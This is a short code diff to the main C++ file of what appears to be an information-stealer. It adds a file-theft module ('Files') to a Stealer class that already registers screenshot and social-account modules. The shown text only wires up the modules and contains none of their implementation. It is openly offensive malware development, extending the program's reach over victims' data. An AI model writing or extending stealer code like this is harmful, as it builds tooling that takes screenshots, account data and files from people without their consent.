@@ -5,11 +5,13 @@
 #include "Stealer.h"
 #include "impl/Screenshot.h"
 #include "impl/socials/Socials.h"
+#include "impl/files/Files.h"
 #include <thread>
 
 void Stealer::registerModules() {
     this->modules.push_back(new Screenshot());
     this->modules.push_back(new Socials());
+    this->modules.push_back(new Files());
 }
 
 
